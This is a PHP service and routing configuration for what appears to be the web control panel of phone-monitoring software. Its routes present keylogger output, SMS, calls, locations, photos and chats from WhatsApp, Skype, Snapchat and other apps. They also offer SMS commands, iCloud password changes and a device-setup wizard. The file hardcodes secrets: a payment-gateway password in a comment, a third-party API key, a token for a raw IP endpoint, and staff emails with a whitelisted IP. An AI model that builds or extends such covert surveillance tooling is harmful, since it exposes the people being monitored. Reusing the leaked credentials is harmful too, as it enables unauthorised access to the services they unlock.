<?php

use CS\Settings\GlobalSettings;
use Components\WizardRouter;
use Models\Modules;

$di->setShared('db', function() use ($config) {
    $pdo = new \PDO("mysql:host={$config['db']['host']};port=3306;dbname={$config['db']['dbname']}", $config['db']['username'], $config['db']['password'], $config['dbOptions']);
    if ($config['environment'] == 'development') {
        $pdo->exec("set profiling_history_size = 1000; set profiling = 1;");
    }
    return $pdo;
});

$di->setShared('dataDb', function() use ($di) {
    //$di['devId']
    if (is_array($di['config']['dataDb'])) {
        $dbNumber = 1;
        $dbConfig = $di['config']['dataDb'][$dbNumber];
    } else {
        $dbConfig = GlobalSettings::getShardDB($di['devId']);
    }

    $pdo = new \PDO("mysql:host={$dbConfig['host']};dbname={$dbConfig['dbname']}", $dbConfig['username'], $dbConfig['password'], $di['config']['dbOptions']);
    if ($di['config']['environment'] == 'development') {
        $pdo->exec("set profiling_history_size = 1000; set profiling = 1;");
    }
    return $pdo;
});

$di->setShared('mailSender', function() use ($di) {
    if ($di['config']['environment'] == 'development') {
        $mailSender = new CS\Mail\MailSender(new \CS\Mail\Processor\FileProcessor(ROOT_PATH . 'logs/mailSender.log'));
    } else {
        $queue = GlobalSettings::getQueueConfig();

        $processor = new CS\Mail\Processor\QueueProcessor($queue['host'], $queue['port'], $queue['user'], $queue['password'], 'mail');
        $mailSender = new CS\Mail\MailSender($processor);
    }

    $auth = $di['auth'];

    if ($auth->hasIdentity()) {
        $authData = $auth->getIdentity();
        $mailSender->setUserId($authData['id']);
    }

    CS\Users\UsersManager::registerListeners($di['db']);

    return $mailSender->setLocale($di['t']->getLocale())
                    ->setSiteId($di['config']['site']);
});

$di->set('isWizardEnabled', true);

$di->setShared('router', function() use($config, $di) {
    $router = new \System\Router();
    $router->setBaseUrl($config['domain']);
    $router->add('main', new \System\Router\Route('/', array('controller' => 'Index', 'action' => 'login', 'public' => true)));
    $router->add('logout', new \System\Router\Route('/logout', array('controller' => 'Index', 'action' => 'logout', 'public' => true)));
    $router->add('lostPassword', new \System\Router\Route('/lostPassword', array('controller' => 'Index', 'action' => 'lostPassword', 'public' => true)));
    $router->add('resetPassword', new \System\Router\Route('/resetPassword', array('controller' => 'Index', 'action' => 'resetPassword', 'public' => true)));
    $router->add('unlockAccount', new \System\Router\Route('/unlockAccount', array('controller' => 'Index', 'action' => 'unlockAccount', 'public' => true)));
    $router->add('support', new \System\Router\Route('/support', array('controller' => 'Index', 'action' => 'support')));
    $router->add('profile', new \System\Router\Route('/profile', array('controller' => 'Profile', 'action' => 'index')));
    $router->add('profileICloudPasswordReset', new \System\Router\Regex('/profile/iCloudAccount/:deviceId', array('controller' => 'Profile', 'action' => 'changeICloudPassword'), array('deviceId' => '.+')));
    $router->add('profileAssignChoice', new \System\Router\Route('/profile/assign/subscriptions', array('controller' => 'Profile', 'action' => 'assignChoice')));
    $router->add('profileUpgradeConfirm', new \System\Router\Route('/profile/assign/confirm', array('controller' => 'Profile', 'action' => 'upgradeConfirm')));
    $router->add('profileAssignProcess', new \System\Router\Route('/profile/assign/process', array('controller' => 'Profile', 'action' => 'assignProcess')));

    $router->add('cp', new \System\Router\Route('/cp', array('controller' => 'CP', 'action' => 'main')));
    $router->add(Modules::CALLS, new \System\Router\Route('/cp/calls', array('controller' => 'Calls', 'action' => 'index')));
    $router->add(Modules::SMS, new \System\Router\Route('/cp/sms', array('controller' => 'Sms', 'action' => 'index')));
    $router->add(Modules::LOCATIONS, new \System\Router\Route('/cp/locations', array('controller' => 'Locations', 'action' => 'index')));
    $router->add(Modules::BROWSER_BOOKMARKS, new \System\Router\Route('/cp/bookmarks', array('controller' => 'Bookmarks', 'action' => 'index')));
    $router->add(Modules::BROWSER_HISTORY, new \System\Router\Route('/cp/browserHistory', array('controller' => 'BrowserHistory', 'action' => 'index')));
    $router->add(Modules::CALENDAR, new \System\Router\Route('/cp/calendar', array('controller' => 'Calendar', 'action' => 'index')));
    $router->add(Modules::CONTACTS, new \System\Router\Route('/cp/contacts', array('controller' => 'Contacts', 'action' => 'index')));
    $router->add(Modules::KEYLOGGER, new \System\Router\Route('/cp/keylogger', array('controller' => 'Keylogger', 'action' => 'index')));
    $router->add(Modules::PHOTOS, new \System\Router\Route('/cp/photos', array('controller' => 'Photos', 'action' => 'index')));
    $router->add(Modules::VIDEOS, new \System\Router\Route('/cp/videos', array('controller' => 'Videos', 'action' => 'index')));
    $router->add(Modules::VIBER, new \System\Router\Route('/cp/viber', array('controller' => 'Viber', 'action' => 'index')));
    $router->add(Modules::SKYPE, new \System\Router\Route('/cp/skype', array('controller' => 'Skype', 'action' => 'index')));
    $router->add(Modules::WHATSAPP, new \System\Router\Route('/cp/whatsapp', array('controller' => 'Whatsapp', 'action' => 'index')));
    $router->add(Modules::FACEBOOK, new \System\Router\Route('/cp/facebook', array('controller' => 'Facebook', 'action' => 'index')));
    $router->add(Modules::VK, new \System\Router\Route('/cp/vk', array('controller' => 'Vk', 'action' => 'index')));
    $router->add(Modules::KIK, new \System\Router\Route('/cp/kik', array('controller' => 'Kik', 'action' => 'index')));
    $router->add(Modules::SNAPCHAT, new \System\Router\Route('/cp/snapchat', array('controller' => 'Snapchat', 'action' => 'index')));
    $router->add(Modules::EMAILS, new \System\Router\Route('/cp/emails', array('controller' => 'Emails', 'action' => 'index')));
    $router->add(Modules::NOTES, new \System\Router\Route('/cp/notes', array('controller' => 'Notes', 'action' => 'index')));
    $router->add(Modules::APPLICATIONS, new \System\Router\Route('/cp/applications', array('controller' => 'Applications', 'action' => 'index')));
    $router->add(Modules::SETTINGS, new \System\Router\Route('/cp/settings', array('controller' => 'DeviceSettings', 'action' => 'index')));
    $router->add(Modules::SMS_COMMANDS, new \System\Router\Route('/cp/smsCommands', array('controller' => 'SmsCommands', 'action' => 'index')));
    $router->add(Modules::INSTAGRAM, new \System\Router\Route('/cp/instagram', array('controller' => 'Instagram', 'action' => 'index')));
    $router->add('activeDays', new \System\Router\Route('/cp/locations/activeDays', array('controller' => 'Locations', 'action' => 'disableDays')));
    $router->add('browserBlocked', new \System\Router\Route('/cp/browserBlocked', array('controller' => 'BrowserHistory', 'action' => 'browserBlocked')));
    $router->add('videosCamera', new \System\Router\Route('/cp/videos/camera', array('controller' => 'Videos', 'action' => 'camera')));
    $router->add('videosNoCamera', new \System\Router\Route('/cp/videos/other', array('controller' => 'Videos', 'action' => 'noCamera')));
    $router->add('locationsZones', new \System\Router\Route('/cp/locations/zones', array('controller' => 'Locations', 'action' => 'zones')));
    $router->add('locationsZonesAdd', new \System\Router\Route('/cp/locations/zones/add', array('controller' => 'Locations', 'action' => 'zoneAdd')));
    $router->add('locationsExport', new \System\Router\Route('/cp/locations/export', array('controller' => 'Locations', 'action' => 'export')));
    $router->add('locationsCloudLocation', new \System\Router\Route('/cp/locations/cloud', array('controller' => 'Locations', 'action' => 'cloud')));

    if ($di->get('isWizardEnabled')) {
        $router->add('billing', new \System\Router\Route('/subscriptions', array('controller' => 'Billing', 'action' => 'index')));
        //$router->add('billingAddDevice', new \System\Router\Route('/subscriptions/addDevice', array('controller' => 'Billing', 'action' => 'addDevice')));
        $router->add('billingAssignDevice', new \System\Router\Route('/subscriptions/assignDevice', array('controller' => 'Billing', 'action' => 'assignDevice')));
        //$router->add('billingAddICloudDevice', new \System\Router\Route('/subscriptions/addICloudDevice', array('controller' => 'Billing', 'action' => 'addICloudDevice')));
        $router->add('billingLicense', new \System\Router\Regex('/subscriptions/license/:id', array('controller' => 'Billing', 'action' => 'license'), array('id' => '[0-9]+')));
        $router->add('billingLicenseDisable', new \System\Router\Regex('/subscriptions/license/:id/disable', array('controller' => 'Billing', 'action' => 'disableLicense'), array('id' => '[0-9]+')));
        $router->add('billingLicenseEnable', new \System\Router\Regex('/subscriptions/license/:id/enable', array('controller' => 'Billing', 'action' => 'enableLicense'), array('id' => '[0-9]+')));
        $router->add('billingLicenseDiscountOffer', new \System\Router\Regex('/subscriptions/license/:id/discount', array('controller' => 'Billing', 'action' => 'discountOfferLicense'), array('id' => '[0-9]+')));
        $router->add('billingLicenseUpgradePremium', new \System\Router\Regex('/subscriptions/upgrade/:id/premium', array('controller' => 'Billing', 'action' => 'licenseUpgradePremium'), array('id' => '[0-9]+')));
        $router->add('billingLicenseUpgradeQuarter', new \System\Router\Regex('/subscriptions/upgrade/:id/quarter', array('controller' => 'Billing', 'action' => 'licenseUpgradeQuarter'), array('id' => '[0-9]+')));
        $router->add('billingLicenseUpgradeMonthly', new \System\Router\Regex('/subscriptions/upgrade/:id/monthly', array('controller' => 'Billing', 'action' => 'licenseUpgradeMonthly'), array('id' => '[0-9]+')));
    } else {
        $router->add('billing', new \System\Router\Route('/billing', array('controller' => 'Billing', 'action' => 'index')));
        $router->add('billingAddDevice', new \System\Router\Route('/billing/addDevice', array('controller' => 'Billing', 'action' => 'addDevice')));
        $router->add('billingAssignDevice', new \System\Router\Route('/billing/assignDevice', array('controller' => 'Billing', 'action' => 'assignDevice')));
        $router->add('billingAddICloudDevice', new \System\Router\Route('/billing/addICloudDevice', array('controller' => 'Billing', 'action' => 'addICloudDevice')));
        $router->add('billingLicense', new \System\Router\Regex('/billing/license/:id', array('controller' => 'Billing', 'action' => 'license'), array('id' => '[0-9]+')));
        $router->add('billingLicenseDisable', new \System\Router\Regex('/subscriptions/license/:id/disable', array('controller' => 'Billing', 'action' => 'disableLicense'), array('id' => '[0-9]+')));
        $router->add('billingLicenseEnable', new \System\Router\Regex('/subscriptions/license/:id/enable', array('controller' => 'Billing', 'action' => 'enableLicense'), array('id' => '[0-9]+')));
        $router->add('billingLicenseDiscountOffer', new \System\Router\Regex('/subscriptions/license/:id/discount', array('controller' => 'Billing', 'action' => 'discountOfferLicense'), array('id' => '[0-9]+')));
    }


    if ($di->get('isWizardEnabled')) {
        $router->add(WizardRouter::STEP_PACKAGE, new WizardRouter('/wizard', WizardRouter::STEP_PACKAGE, $_GET, array('.*' => 'Package')));
        $router->add(WizardRouter::STEP_PLATFORM, new WizardRouter('/wizard/platform', WizardRouter::STEP_PLATFORM, $_GET, array('.*' => 'Platform')));
        $router->add(WizardRouter::STEP_SETUP, new WizardRouter('/wizard/setup', WizardRouter::STEP_SETUP, $_GET, array('.*' => 'Setup')));
        $router->add(WizardRouter::STEP_REGISTER, new WizardRouter('/wizard/register', WizardRouter::STEP_REGISTER, $_GET, array('android|ios' => 'registerApp', 'icloud' => 'registerICloud')));
        $router->add(WizardRouter::STEP_FINISH, new WizardRouter('/wizard/finish', WizardRouter::STEP_FINISH, $_GET, array('.*' => 'finish')));
    }

    $router->add('applicationsManage', new \System\Router\Regex('/cp/applications/:id/manage', array('controller' => 'Applications', 'action' => 'manage'), array('id' => '[^/]+')));
    $router->add('content', new \System\Router\Regex('/:uri', array('controller' => 'Index', 'action' => 'content', 'public' => true), array('uri' => '.+\.html')));
    $router->add('locale', new \System\Router\Regex('/locale/:value', array('controller' => 'Index', 'action' => 'locale', 'public' => true), array('value' => '.+')));
    $router->add('setDevice', new \System\Router\Regex('/setDevice/:devId', array('controller' => 'CP', 'action' => 'setDevice'), array('devId' => '.+')));
    $router->add('smsList', new \System\Router\Regex('/cp/sms/:phoneNumber', array('controller' => 'Sms', 'action' => 'list'), array('phoneNumber' => '[^/]+')));
    $router->add('smsGroupList', new \System\Router\Regex('/cp/sms/group/:group', array('controller' => 'Sms', 'action' => 'groupList'), array('group' => '[^/]+')));
    $router->add('photosAlbum', new \System\Router\Regex('/cp/photos/album/:album', array('controller' => 'Photos', 'action' => 'album'), array('album' => '.+')));
    $router->add('viberTab', new \System\Router\Regex('/cp/viber/:tab', array('controller' => 'Viber', 'action' => 'index'), array('tab' => 'private|group|calls')));
    $router->add('skypeTab', new \System\Router\Regex('/cp/skype/:tab', array('controller' => 'Skype', 'action' => 'index'), array('tab' => 'messages|calls')));
    $router->add('whatsappTab', new \System\Router\Regex('/cp/whatsapp/:tab', array('controller' => 'Whatsapp', 'action' => 'index'), array('tab' => 'private|group|calls')));
    $router->add('facebookTab', new \System\Router\Regex('/cp/facebook/:tab', array('controller' => 'Facebook', 'action' => 'index'), array('tab' => 'messages|calls')));
    $router->add('vkTab', new \System\Router\Regex('/cp/vk/:tab', array('controller' => 'Vk', 'action' => 'index'), array('tab' => 'private|group')));
    $router->add('vkList', new \System\Router\Regex('/cp/vk/:tab/:account/:id', array('controller' => 'Vk', 'action' => 'list'), array('tab' => 'private|group', 'account' => '[0-9]+', 'id' => '[0-9]+')));
    //$router->add('facebookTab', new \System\Router\Regex('/cp/facebook/:tab', array('controller' => 'Facebook', 'action' => 'index'), array('tab' => '[a-z]+')));
    $router->add('viberList', new \System\Router\Regex('/cp/viber/:tab/:id', array('controller' => 'Viber', 'action' => 'list'), array('tab' => 'group|private', 'id' => '.+')));
    $router->add('skypeList', new \System\Router\Regex('/cp/skype/:account/:tab/:id', array('controller' => 'Skype', 'action' => 'list'), array('account' => '[^/]+', 'tab' => 'group|private', 'id' => '[^/]+')));
    $router->add('skypeListConference', new \System\Router\Regex('/cp/skype/:account/conference/:id', array('controller' => 'Skype', 'action' => 'conference'), array('account' => '[^/]+', 'id' => '[^/]+')));
    $router->add('whatsappList', new \System\Router\Regex('/cp/whatsapp/:tab/:id', array('controller' => 'Whatsapp', 'action' => 'list'), array('tab' => 'private|group', 'id' => '[0-9]+')));
    $router->add('facebookList', new \System\Router\Regex('/cp/facebook/:account/:tab/:id', array('controller' => 'Facebook', 'action' => 'list'), array('account' => '[^/]+', 'tab' => 'private|group', 'id' => '[a-zA-Z0-9\:]+')));
    $router->add('kikList', new \System\Router\Regex('/cp/kik/:account/:tab/:id', array('controller' => 'Kik', 'action' => 'list'), array('account' => '[^/]+', 'tab' => 'private|group', 'id' => '[^/]+')));
    $router->add('snapchatList', new \System\Router\Regex('/cp/snapchat/:account/:id', array('controller' => 'Snapchat', 'action' => 'list'), array('account' => '[^/]+', 'id' => '[^/]+')));
    $router->add('emailsSelected', new \System\Router\Regex('/cp/emails/:account', array('controller' => 'Emails', 'action' => 'index'), array('account' => '[^/]+'))); //[-._@a-zA-Z0-9]{6,60}
    $router->add('emailsView', new \System\Router\Regex('/cp/emails/:account/:timestamp', array('controller' => 'Emails', 'action' => 'view'), array('account' => '[^/]+', 'timestamp' => '[\d]{1,10}')));
    $router->add('notesView', new \System\Router\Regex('/cp/notes/:account/:timestamp', array('controller' => 'Notes', 'action' => 'view'), array('account' => '[^/]+', 'timestamp' => '[\d]{1,10}')));
    $router->add('locationsZonesEdit', new \System\Router\Regex('/cp/locations/zones/edit/:id', array('controller' => 'Locations', 'action' => 'zoneEdit'), array('id' => '[0-9]+')));
    $router->add('locationsSetup', new \System\Router\Regex('/cp/locations/setup/:step', array('controller' => 'Locations', 'action' => 'setup'), array('step' => 'init|locationActivation|deviceConnection')));
    $router->add('instagramTab', new \System\Router\Regex('/cp/instagram/:account/:tab', array('controller' => 'Instagram', 'action' => 'tab'), array('account' => '[0-9]+', 'tab' => 'own|friends|commented')));
    $router->add('instagramPost', new \System\Router\Regex('/cp/instagram/:account/post/:post', array('controller' => 'Instagram', 'action' => 'view'), array('account' => '[0-9]+', 'post' => '[0-9]+')));

    $router->add('profileMailUnsibscribe', new \System\Router\Regex('/profile/unsubscribe/:type', array('controller' => 'Profile', 'action' => 'mailUnsubscribe', 'public' => true), array('type' => '[^/]+')));

    $router->add('directLogin', new \System\Router\Route('/admin/login', array('controller' => 'Index', 'action' => 'directLogin', 'public' => true)));

    $router->add('tos', new \System\Router\Route('/tos', array('controller' => 'Index', 'action' => 'tos')));
    $router->add('policy', new \System\Router\Route('/policy', array('controller' => 'Index', 'action' => 'policy')));

    return $router;
});

$di->setShared('session', function () use ($di) {
    $sessionSettings = $di['config']['session'];
    if (strpos($di['config']['domain'], 'https://') === false) {
        $sessionSettings['cookieParams']['secure'] = false;
    }

    System\Session::setConfig($sessionSettings);
    if ($di['config']['demo']) {
        System\Session::setSessionHandler(new System\Session\Handler\CookieSessionHandler($di['request']));
    } else if ($di['config']['environment'] == 'production') {
        $redisConfig = CS\Settings\GlobalSettings::getRedisConfig('sessions', $di['config']['site']);
        $redisClient = new Predis\Client($redisConfig);
        System\Session::setSessionHandler(new System\Session\Handler\RedisSessionHandler($redisClient));
    }

    return new System\Session;
});

$di->setShared('flashMessages', function () use ($di) {
    return new \System\FlashMessages($di);
});

$di->setShared('auth', function () use ($di) {
    $auth = new \System\Auth($di);

    if ($di['config']['demo'] && !$auth->hasIdentity()) {
        $auth->setIdentity(require ROOT_PATH . 'demoUserData.php');
    }

    return $auth;
});

$di->setShared('view', function() use ($di) {
    $fenom = \Fenom::factory($di['config']['fenom']['templatesDir'], $di['config']['fenom']['compileDir'], $di['config']['fenom']['options']);

    return new \System\View\Fenom($fenom);
});

$di->setShared('t', function () use ($di) {
    $translator = new System\Translator($di, array_keys($di['config']['locales']));

    $locale = $di->get('request')->cookie('locale');

    if (!empty($locale) && key_exists($locale, $di['config']['locales'])) {
        $translator->setLocale($locale);
    } else {
        $translator->setBestLocale();
        setcookie('locale', $translator->getLocale(), time() + 3600 * 24 * 30, '/', $di['config']['cookieDomain']);
    }

    $translator->setTranslations(require ROOT_PATH . 'locales/' . $translator->getLocale() . '.php');

    return $translator;
});

$di->setShared('S3', function () use ($di) {
    // temporary load from global settings
    $config['s3'] = GlobalSettings::getS3Config();
    $config['cloudFront'] = GlobalSettings::getCloudFrontConfig();

    $s3 = new \S3($config['s3']['key'], $config['s3']['secret']);
    $s3->setSigningKey($config['cloudFront']['keyPairId'], $config['cloudFront']['privatKeyFilename']);

    return $s3;
});

//$di->setShared('fastSpringGateway', function () {
//    $fastSpringConfig = GlobalSettings::getFastSpringConfig();
//
//    $gateway = new \Seller\FastSpring\Gateway();
//
//    return $gateway->setStoreId($fastSpringConfig['storeId'])
//                    ->setPrivateKey($fastSpringConfig['privateKey'])
//                    ->setUserName('api@dizboard.com')//$fastSpringConfig['userName'])
//                    ->setUserPassword('c0RdI48G7Est'); //$fastSpringConfig['userPassword']);
//});

$di->setShared('queueClient', function () use ($config) {
    $queueConfig = GlobalSettings::getQueueConfig();

    if ($config['environment'] == 'production') {
        return new \CS\Queue\RabbitClient(
                $queueConfig['host'], $queueConfig['port'], $queueConfig['user'], $queueConfig['password'], $queueConfig['vhost']
        );
    } else {
        $queueClient = new \CS\Queue\QueueToFile;
        $queueClient->setDirectory(__DIR__ . "/logs");
        return $queueClient;
    }
});

$di->setShared('usersNotesProcessor', function() use ($di) {
    $auth = $di['auth'];

    CS\Users\UsersManager::registerListeners($di['db']);

    if (!$auth->hasIdentity()) {
        return new CS\Users\UsersNotes($di['db']);
    }

    $authData = $auth->getIdentity();

    if (isset($authData['admin_id'])) {
        return new CS\Users\UsersNotes($di['db'], $authData['id'], $authData['admin_id']);
    }

    return new CS\Users\UsersNotes($di['db'], $authData['id']);
});

$di->setShared('eventManager', function() use ($di) {
    CS\Users\UsersManager::registerListeners($di['db']);

    return \EventManager\EventManager::getInstance();
});

$di->setShared('usersManager', function() use ($di) {
    $usersManager = new CS\Users\UsersManager($di['db']);

    return $usersManager->setUsersNotesProcessor($di['usersNotesProcessor']);
});

$di->setShared('devicesManager', function() use ($di) {
    $devicesManager = new CS\Devices\Manager($di['db']);

    return $devicesManager->setUsersNotesProcessor($di['usersNotesProcessor']);
});

$di->setShared('gatewaysContainer', function () {
    $fastSpringConfig = GlobalSettings::getFastSpringConfig();

    return new \Seller\GatewaysContainer(array(
        'fastspring' => $fastSpringConfig
    ));
});

$di->setShared('gatewaysContextualContainer', function () {
    $fastSpringContextualConfig = GlobalSettings::getFastSpringContextualConfig();

    return new \Seller\GatewaysContainer(array(
        'fastspring-contextual' => $fastSpringContextualConfig
    ));
});

$di->setShared('billingManager', function () use ($di) {
    $billingManager = new \CS\Billing\Manager($di['db']);
    $billingManager->setGatewaysContainer($di['gatewaysContainer']);

    return $billingManager;
});

$di->setShared('billingContextualManager', function () use ($di) {
    $billingManager = new \CS\Billing\Manager($di['db']);
    $billingManager->setGatewaysContainer($di['gatewaysContextualContainer']);

    return $billingManager;
});
    
//$di->setShared('reincubateClient', function () use ($di) {
//    $reincubateClient = new \Reincubate\ReincubateClient('JqwsiWAUbLXasXgPADaUbzOeQTgfCDHBkChFtXtYWvoohgvprkxqdzwGXmnfQzTg', $di['logger']);
//
//    return $reincubateClient;
//});

$di->setShared('cloudDeviceManager', function () use ($di) {
    $auth = $di['auth']->getIdentity();

    $devicesModel = new Models\Devices($di);
    $cloudDeviceManager = new Components\CloudDeviceManager\AppleCloudDeviceManager('http://165.227.142.74:8085', '839df7bc84f206160705dec7730eda74b402b53c', $auth['id'], $devicesModel, 'aasdasdads');
    //$cloudDeviceManager = new \Components\CloudDeviceManager\ReincubateDeviceManager($auth['id'], $devicesModel, $di['reincubateClient'], $di['chachePool'], $di['chachePool']);

    return $cloudDeviceManager;
});

$di->set('isTestUser', function($id) use($config) {

    if ($config['environment'] == 'production') {
        return in_array($id, array(
                    1, //b.orest@dizboard.com
                    2, //pm@dizboard.com
                    10, //p.olya@dizboard.com
                    11, //g.zhenya@dizboard.com
                    280 //qa@dizboard.com
                )) || (\IP::getRealIP() === '176.38.120.13');
    }

    return true;
});

$di->setShared('isTest', function() use($config) {

    if ($config['environment'] == 'production') {
        return (\IP::getRealIP() == '176.38.120.13');
    }

    return true;
});

$di->setShared('freeTrialLinks', function () use ($config) {
    return new CS\Users\FreeTrialLinks($config['cookieDomain']);
});

$di->setShared('isFreTrialLinksVisible', function () use ($di) {

    if ($di['config']['demo']) {
        /** @var $freeTrialLinks CS\Users\FreeTrialLinks */
        $freeTrialLinks = $di->get('freeTrialLinks');
        return $freeTrialLinks->isAvailable();
    }
    return false;
});
